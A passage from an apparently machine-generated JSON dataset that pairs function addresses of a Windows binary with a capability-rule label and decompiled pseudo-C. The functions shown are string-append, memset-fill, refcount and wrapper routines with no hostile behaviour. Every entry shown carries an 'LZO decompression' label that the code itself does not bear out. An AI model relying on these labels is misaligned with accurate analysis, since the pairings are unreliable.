            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0046c470(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    \n    iVar1 = *(*param_2 + -0xc);\n    if (iVar1 != 0) {\n        iVar2 = *param_1;\n        uVar5 = *(iVar2 + -0xc) + iVar1;\n        if ((uVar5 < *(iVar2 + -8) || uVar5 == *(iVar2 + -8)) && (*(iVar2 + -4) < 1)) {\n            puVar3 = *param_2;\n            puVar4 = *param_1 + *(*param_1 + -0xc);\n        }\n        else {\n            fcn.0046d280(uVar5);\n            puVar3 = *param_2;\n            puVar4 = *param_1 + *(*param_1 + -0xc);\n        }\n        if (iVar1 == 1) {\n            *puVar4 = *puVar3;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar4, puVar3, iVar1);\n        }\n        iVar1 = *param_1;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0xc) = uVar5;\n        *(iVar1 + uVar5) = 0;\n        return param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 344
    },
    "0046c600": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0046c600(int32_t *param_1, uint32_t param_2, char param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t extraout_ECX;\n    uint32_t uVar4;\n    uint in_stack_ffffffd8;\n    \n    iVar1 = *param_1;\n    iVar2 = *(iVar1 + -0xc);\n    if (param_2 <= 0x3ffffffcU - iVar2) {\n        uVar4 = iVar2 + param_2;\n        if ((uVar4 < *(iVar1 + -8) || uVar4 == *(iVar1 + -8)) && (*(iVar1 + -4) < 1)) {\n            pcVar3 = *param_1 + *(*param_1 + -0xc);\n        }\n        else {\n            fcn.0046d280(uVar4);\n            pcVar3 = *param_1 + *(*param_1 + -0xc);\n        }\n        if (param_2 == 1) {\n            *pcVar3 = param_3;\n        }\n        else {\n            sub.msvcrt.dll_memset(pcVar3, param_3, param_2);\n        }\n        iVar1 = *param_1;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0xc) = uVar4;\n        *(iVar1 + uVar4) = 0;\n        return iVar1;\n    }\n    fcn.0049ec30(0x502302);\n    fcn.0046c1d0(in_stack_ffffffd8, iVar2);\n    return extraout_ECX;\n}\n",
        "token_count": 376
    },
    "0046d560": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0046d560(int32_t *param_1, uchar param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *param_1;\n    iVar3 = *(iVar2 + -0xc);\n    uVar1 = iVar3 + 1;\n    if ((*(iVar2 + -8) <= uVar1 && uVar1 != *(iVar2 + -8)) || (0 < *(iVar2 + -4))) {\n        fcn.0046d280(uVar1);\n    }\n    *(*param_1 + *(*param_1 + -0xc)) = param_2;\n    iVar2 = *param_1;\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar1;\n    *(iVar2 + 1 + iVar3) = 0;\n    return;\n}\n",
        "token_count": 207
    },
    "0046f3d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0046f3d0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x50a858;\n    in_ECX[1] = arg_ch != 0;\n    in_ECX[2] = arg_8h;\n    uVar1 = fcn.0048f250();\n    in_ECX[4] = uVar1;\n    fcn.0046f090(0);\n    return;\n}\n",
        "token_count": 143
    },
    "0046fb10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0046fb10(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x50a868;\n    in_ECX[1] = arg_ch != 0;\n    in_ECX[2] = arg_8h;\n    uVar1 = fcn.0048f250();\n    in_ECX[4] = uVar1;\n    fcn.0046f7d0(0);\n    return;\n}\n",
        "token_count": 143
    },
    "0046ffb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0046ffb0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x50a878;\n    fcn.0046d6c0(arg_8h);\n    return;\n}\n",
        "token_count": 81
    },
    "00470010": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470010(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar auStack13 [9];\n    \n    iVar3 = *0x4f59f4;\n    *param_1 = 0x50a878;\n    iVar2 = param_1[1];\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 + -4);\n        *(iVar2 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar2 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        fcn.0049d380();\n        return;\n    }\n    fcn.0046bf60(auStack13);\n    fcn.0049d380();\n    return;\n}\n",
        "token_count": 214
    },
    "004700a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004700a0(uint *param_1, uint param_2)\n\n{\n    fcn.00481620(param_2);\n    *param_1 = 0x50a88c;\n    return;\n}\n",
        "token_count": 53
    },
    "004714b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004714b0(uint *param_1, uint param_2)\n\n{\n    fcn.0046ff10(param_2);\n    *param_1 = 0x50a910;\n    return;\n}\n",
        "token_count": 53
    },
    "00471570": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00471570(uint *param_1, uint param_2)\n\n{\n    fcn.0046ff10(param_2);\n    *param_1 = 0x50a924;\n    return;\n}\n",
        "token_count": 52
    },
    "00471630": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00471630(uint *param_1, uint param_2)\n\n{\n    fcn.0046ff10(param_2);\n    *param_1 = 0x50a938;\n    return;\n}\n",
        "token_count": 52
    },
    "00471d60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl\nfcn.00471d60(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t arg_30h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        *NULL = fcn.0046ba90(0, 0, &var_1dh);\n        uVar3 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_1dh + 1);\n        if (*arg_28h == 0) {\n            if (*(arg_30h + 0x18) != NULL) {\n                (**(arg_30h + 0x18))(arg_30h);\n            }\n            fcn.0046d6c0(&var_1dh + 1);\n            uVar2 = *(stack0xffffffe0 + -0xc);\n            *(arg_30h + 0x18) = 0x473fd0;\n            *(arg_30h + 4) = uVar2;\n        }\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(stack0xffffffe0 + -4);\n            *(stack0xffffffe0 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = stack0xffffffe0 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.0046bf60(&var_1dh);\n        }\n    }\n    else {\n        uVar3 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 562
    },
    "00472020": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl\nfcn.00472020(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t arg_30h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        *NULL = fcn.00463b80(0, 0, &var_1dh);\n        uVar3 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_1dh + 1);\n        if (*arg_28h == 0) {\n            if (*(arg_30h + 0x18) != NULL) {\n                (**(arg_30h + 0x18))(arg_30h);\n            }\n            fcn.00465950(&var_1dh + 1);\n            uVar2 = *(stack0xffffffe0 + -0xc);\n            *(arg_30h + 0x18) = 0x474050;\n            *(arg_30h + 4) = uVar2;\n        }\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(stack0xffffffe0 + -4);\n            *(stack0xffffffe0 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = stack0xffffffe0 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            fcn.004640a0(&var_1dh);\n        }\n    }\n    else {\n        uVar3 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar3;\n}\n",
        "token_count": 571
    },
    "00472310": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004724db)\n\nuint __cdecl\nfcn.00472310(uint noname_0, int32_t *noname_1, uint noname_2, uint noname_3, uint32_t noname_4, uint noname_5, \n            uint noname_6, uint noname_7, uint noname_8, uint noname_9, int32_t noname_10, uint noname_11, \n            uint noname_12, uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, \n            uint noname_18, uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, \n            uint noname_24, uint noname_25, uint noname_26, uint noname_27, uint noname_28, uint noname_29, \n            uint noname_30, uint noname_31, uint noname_32, uint noname_33, uint noname_34, uint noname_35, \n            uint noname_36, uint noname_37, uint noname_38, uint noname_39, uint noname_40, uint noname_41, \n            uint noname_42, uint noname_43, uint noname_44, uint noname_45, uint noname_46, uint noname_47, \n            uint noname_48, uint noname_49, uint noname_50, uint noname_51, uint arg_ch, uint arg_10h, uint arg_14h, \n            uint arg_18h, uint arg_1ch, uint arg_20h, uint noname_58, uint noname_59, uint noname_60, uint arg_30h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_1ch_3;\n    uint var_1ch;\n    uint var_bp_ch;\n    uint32_t in_stack_fffffe70;\n    uchar *puStack352;\n    uchar auStack344 [8];\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack316;\n    uint uStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    uint32_t uStack300;\n    int32_t *piStack292;\n    uint uStack288;\n    uint uStack284;\n    uchar uStack280;\n    uint uStack276;\n    ushort uStack272;\n    ushort uStack268;\n    ulong uStack266;\n    int32_t *piStack256;\n    uchar uStack237;\n    int32_t iStack236;\n    uint uStack220;\n    int32_t iStack212;\n    uchar *puStack208;\n    int32_t *piStack196;\n    uint32_t uStack184;\n    int32_t iStack160;\n    uchar *puStack148;\n    uchar auStack140 [8];\n    uint uStack132;\n    uchar *puStack128;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uchar *puStack100;\n    uint32_t uStack96;\n    int32_t *piStack88;\n    uint32_t uStack76;\n    int32_t var_30h_4;\n    uint var_2ch_2;\n    uchar var_1dh_2;\n    int32_t var_1ch_4;\n    \n    if (noname_10 == 0) {\n        uStack96 = 0x4723e6;\n        uVar3 = (**(*noname_1 + 8))();\n        return uVar3;\n    }\n    iStack212 = *(noname_10 + 0x18);\n    if (iStack212 != 0) {\n        uStack96 = 0x472355;\n        fcn.0046d650();\n        puStack100 = noname_3;\n        iStack104 = noname_2;\n        uStack108 = 0x472388;\n        uStack96 = noname_4 & 0xff;\n        uVar3 = (**(*noname_1 + 0xc))();\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(var_1ch_4 + -4);\n            *(var_1ch_4 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_1ch_4 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar4 < 1) {\n            puStack128 = &stack0xffffffdf;\n            uStack132 = 0x472413;\n            fcn.0046bf60();\n            return uVar3;\n        }\n        return uVar3;\n    }\n    uStack96 = 0x472430;\n    uStack112 = fcn.0049eb30(0x5020d8);\n    uStack96 = 0x472443;\n    fcn.0046bf80();\n    puStack100 = 0x47244c;\n    uStack96 = uStack112;\n    fcn.0041b360();\n    uStack108 = noname_6;\n    iStack104 = iStack212;\n    if (var_30h_4 == 0) {\n        puStack208 = 0x472536;\n        puStack100 = &stack0xfffffffc;\n        uVar3 = (**(*piStack88 + 8))();\n        return uVar3;\n    }\n    if (*(var_30h_4 + 0x18) != 0) {\n        puStack208 = 0x47249b;\n        puStack100 = &stack0xfffffffc;\n        fcn.00490c10();\n        uStack220 = 0x4724ce;\n        puStack208 = uStack76 & 0xff;\n        uVar3 = (**(*piStack88 + 0xc))();\n        return uVar3;\n    }\n    puStack208 = 0x47254d;\n    puStack100 = &stack0xfffffffc;\n    uStack220 = fcn.0049eb30(\"uninitialized __any_string\");\n    if (puStack148 != &stack0xffffff74) {\n        puStack208 = 0x472561;\n        fcn.004a34c0();\n    }\n    puStack208 = 0x472569;\n    fcn.0041b360();\n    if (iStack160 == 0) {\n        uStack300 = 0x472644;\n        puStack208 = &stack0xffffff9c;\n        uVar3 = (**(*piStack196 + 8))();\n        return uVar3;\n    }\n    iStack308 = *(iStack160 + 0x18);\n    if (iStack308 == 0) {\n        uStack300 = 0x47268f;\n        puStack208 = &stack0xffffff9c;\n        uStack316 = fcn.0049eb30(0x5020d8);\n        uStack300 = 0x4726a2;\n        fcn.004640c0();\n        puStack304 = 0x4726ab;\n        uStack300 = uStack316;\n        fcn.0041b360();\n        if (piStack256 == NULL) {\n            puStack304 = &stack0xffffff30;\n            uVar3 = (**(*piStack292 + 8))\n                              (uStack288, uStack284, uStack280, uStack276, uStack272, CONCAT82(uStack266, uStack268));\n            return uVar3;\n        }\n        if (piStack256[6] != 0) {\n            puStack352 = &stack0xfffffea8;\n            puStack304 = &stack0xffffff30;\n            fcn.00493990(*piStack256, *piStack256 + piStack256[1] * 2, in_stack_fffffe70 & 0xffffff00);\n            uVar3 = (**(*piStack292 + 0xc))(uStack288, uStack284, uStack280, uStack276, uStack272, &stack0xfffffea0);\n            if (puStack352 != &stack0xfffffea8) {\n                fcn.004a34c0(puStack352);\n            }\n            return uVar3;\n        }\n        puStack304 = &stack0xffffff30;\n        uVar3 = fcn.0049eb30(\"uninitialized __any_string\");\n        if (puStack352 != &stack0xfffffea8) {\n            fcn.004a34c0(puStack352);\n        }\n        fcn.0041b360(uVar3);\n        iVar4 = *0x4f59f4;\n        *extraout_ECX = 0x509df0;\n        piVar1 = extraout_ECX[3];\n        if (iVar4 == 0) {\n            iVar4 = piVar1[1];\n            piVar1[1] = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = piVar1 + 1;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 == 1) {\n            (**(*piVar1 + 4))();\n        }\n        *extraout_ECX = 0x50b370;\n        fcn.0048f350(extraout_ECX + 2);\n        fcn.0048f380();\n        uVar3 = fcn.004a34c0(extraout_ECX);\n        return uVar3;\n    }\n    uStack300 = 0x4725b8;\n    puStack208 = &stack0xffffff9c;\n    fcn.004658c0();\n    uStack312 = 0x4725e6;\n    uStack300 = uStack184 & 0xff;\n    uVar3 = (**(*piStack196 + 0xc))();\n    if (*0x4f59f4 == 0) {\n        iVar4 = *(iStack236 + -4);\n        *(iStack236 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack236 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        puStack332 = &stack0xffffff13;\n        uStack336 = 0x472672;\n        fcn.004640a0();\n        return uVar3;\n    }\n    return uVar3;\n}\n",
        "token_count": 2378
    },
    "00472570": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00472570(uint param_1, int32_t *param_2, uint param_3, uint param_4, uint32_t param_5, uint param_6, \n                 uint param_7)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint32_t var_18h;\n    uint var_1ch_3;\n    uint var_20h_2;\n    int32_t var_30h_3;\n    uint32_t in_stack_ffffff3c;\n    uchar *var_30h_5;\n    uint var_2ch;\n    uchar auStack140 [8];\n    uchar auStack132 [3];\n    uchar *var_1dh_3;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uchar *puStack100;\n    uint32_t uStack96;\n    int32_t *piStack88;\n    uint uStack84;\n    uint uStack80;\n    uchar uStack76;\n    uint var_1ch_5;\n    ushort uStack68;\n    ushort uStack64;\n    ulong uStack62;\n    int32_t *piStack52;\n    uchar var_1dh_2;\n    int32_t var_1ch_4;\n    \n    if (var_30h_3 == 0) {\n        uStack96 = 0x472644;\n        uVar3 = (**(*param_2 + 8))();\n        return uVar3;\n    }\n    iStack104 = *(var_30h_3 + 0x18);\n    if (iStack104 != 0) {\n        uStack96 = 0x4725b8;\n        fcn.004658c0();\n        puStack100 = param_4;\n        iStack104 = param_3;\n        uStack108 = 0x4725e6;\n        uStack96 = var_18h & 0xff;\n        uVar3 = (**(*param_2 + 0xc))();\n        if (*0x4f59f4 == 0) {\n            iVar4 = *(var_1ch_4 + -4);\n            *(var_1ch_4 + -4) = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = var_1ch_4 + -4;\n            iVar4 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (0 < iVar4) {\n            return uVar3;\n        }\n        unique0x00001d00 = &stack0xffffffdf;\n        _auStack132 = 0x472672;\n        fcn.004640a0();\n        return uVar3;\n    }\n    uStack96 = 0x47268f;\n    uStack112 = fcn.0049eb30(0x5020d8);\n    uStack96 = 0x4726a2;\n    fcn.004640c0();\n    puStack100 = 0x4726ab;\n    uStack96 = uStack112;\n    fcn.0041b360();\n    uStack108 = var_20h_2;\n    if (piStack52 == NULL) {\n        puStack100 = &stack0xfffffffc;\n        uVar3 = (**(*piStack88 + 8))(uStack84, uStack80, uStack76, var_1ch_5, uStack68, CONCAT82(uStack62, uStack64));\n        return uVar3;\n    }\n    if (piStack52[6] == 0) {\n        puStack100 = &stack0xfffffffc;\n        uVar3 = fcn.0049eb30(\"uninitialized __any_string\");\n        if (var_30h_5 != &stack0xffffff74) {\n            fcn.004a34c0(var_30h_5);\n        }\n        fcn.0041b360(uVar3);\n        iVar4 = *0x4f59f4;\n        *extraout_ECX = 0x509df0;\n        piVar1 = extraout_ECX[3];\n        if (iVar4 == 0) {\n            iVar4 = piVar1[1];\n            piVar1[1] = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = piVar1 + 1;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 == 1) {\n            (**(*piVar1 + 4))();\n        }\n        *extraout_ECX = 0x50b370;\n        fcn.0048f350(extraout_ECX + 2);\n        fcn.0048f380();\n        uVar3 = fcn.004a34c0(extraout_ECX);\n        return uVar3;\n    }\n    var_30h_5 = &stack0xffffff74;\n    puStack100 = &stack0xfffffffc;\n    fcn.00493990(*piStack52, *piStack52 + piStack52[1] * 2, in_stack_ffffff3c & 0xffffff00);\n    uVar3 = (**(*piStack88 + 0xc))(uStack84, uStack80, uStack76, var_1ch_5, uStack68, &fcn.00472570::var_30h_5);\n    if (var_30h_5 != &stack0xffffff74) {\n        fcn.004a34c0(var_30h_5);\n    }\n    return uVar3;\n}\n",
        "token_count": 1246
    },
    "004740d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.004740d0(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t var_22h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    fcn.0046d650(arg_20h, arg_24h, &var_22h);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_22h + 2);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.0046d6c0(&var_1ch);\n    iVar3 = *0x4f59f4;\n    uVar2 = *(var_1ch + -0xc);\n    *(arg_10h + 0x18) = 0x473fd0;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.0046bf60(&var_22h + 1);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar3 = *(unique0x10000064 + -4);\n        *(unique0x10000064 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = unique0x10000064 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.0046bf60(&var_1ch);\n    return;\n}\n",
        "token_count": 548
    },
    "00474310": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.00474310(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t var_22h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    fcn.004658c0(arg_20h, arg_24h, &var_22h);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_22h + 2);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.00465950(&var_1ch);\n    iVar3 = *0x4f59f4;\n    uVar2 = *(var_1ch + -0xc);\n    *(arg_10h + 0x18) = 0x474050;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.004640a0(&var_22h + 1);\n    }\n    if (*0x4f59f4 == 0) {\n        iVar3 = *(unique0x10000064 + -4);\n        *(unique0x10000064 + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = unique0x10000064 + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.004640a0(&var_1ch);\n    return;\n}\n",
        "token_count": 543
    },
    "00474550": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00474550(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.0046d650(arg_10h, arg_14h, &var_1dh);\n    uVar3 = (**(*arg_ch + 8))(&var_1ch, arg_18h);\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.0046bf60(&var_1dh);\n    return uVar3;\n}\n",
        "token_count": 284
    },
    "00474680": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00474680(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_2ch;\n    uchar var_1dh;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.0046d650(arg_10h, arg_14h, &var_1dh);\n    uVar3 = (**(*arg_ch + 8))(&var_1ch, arg_18h);\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_1ch + -4);\n        *(var_1ch + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_1ch + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.0046bf60(&var_1dh);\n    return uVar3;\n}\n",
        "token_count": 284
    },
    "00474930": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.00474930(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_bp_8h;\n    \n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.0046d6c0(&var_ch);\n    iVar3 = *0x4f59f4;\n    uVar2 = *(var_ch + -0xc);\n    *(arg_10h + 0x18) = 0x473fd0;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_ch + -4);\n        *(var_ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.0046bf60(&var_dh);\n    return;\n}\n",
        "token_count": 351
    },
    "00474a90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.00474a90(uint noname_0, int32_t *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_bp_8h;\n    \n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (*(arg_10h + 0x18) != NULL) {\n        (**(arg_10h + 0x18))(arg_10h);\n    }\n    fcn.00465950(&var_ch);\n    iVar3 = *0x4f59f4;\n    uVar2 = *(var_ch + -0xc);\n    *(arg_10h + 0x18) = 0x474050;\n    *(arg_10h + 4) = uVar2;\n    if (iVar3 == 0) {\n        iVar3 = *(var_ch + -4);\n        *(var_ch + -4) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_ch + -4;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.004640a0(&var_dh);\n    return;\n}\n",
        "token_count": 348
    },
    "00474c30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
